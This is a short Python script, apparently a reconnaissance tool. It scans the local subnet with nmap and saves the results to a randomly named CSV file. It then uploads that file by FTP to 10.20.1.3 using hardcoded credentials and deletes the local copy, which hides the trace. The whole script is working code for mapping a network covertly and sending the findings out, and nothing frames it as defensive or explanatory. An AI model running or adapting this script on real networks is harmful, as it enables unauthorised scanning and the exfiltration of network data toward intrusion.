import ftplib
import socket
import netifaces
from netaddr import IPAddress
import nmap
import string
import random
import os



def get_local_ip_and_subnet():
    interfaces = netifaces.interfaces()
    for interface in interfaces:
        try:
            if netifaces.AF_INET in netifaces.ifaddresses(interface):
                addresses = netifaces.ifaddresses(interface)[netifaces.AF_INET]
                for address in addresses:
                    ip_address = address['addr']
                    netmask = address['netmask']
                    if not ip_address.startswith('127.'):
                        return ip_address, netmask
        except ValueError:
            pass

    return None, None


def scan_subnet(ip, subnet):
    nm = nmap.PortScanner()
    print("Scanning subnet " + ip.__str__() + '/' + subnet.__str__())
    nm.scan(hosts=ip.__str__() + '/' + subnet.__str__(), arguments='-T4 -F')
    print("Scan complete")
    return nm.csv()





ip_address, netmask = get_local_ip_and_subnet()

scan = scan_subnet(ip_address, IPAddress(netmask).netmask_bits())

letters = string.ascii_lowercase
result_str = ''.join(random.choice(letters) for i in range(8))
f = open(result_str + "-nmap-output.csv", "a")
f.write(scan)
f.close()

session = ftplib.FTP('10.20.1.3', 'ftp-user', 'Password1')
file = open(result_str + "-nmap-output.csv", 'rb')  # file to send
session.storbinary("STOR "+result_str + "-nmap-output.csv", file)  # send the file
file.close()  # close file and FTP
print("File uploaded successfully")
os.remove(result_str + "-nmap-output.csv")
session.quit()
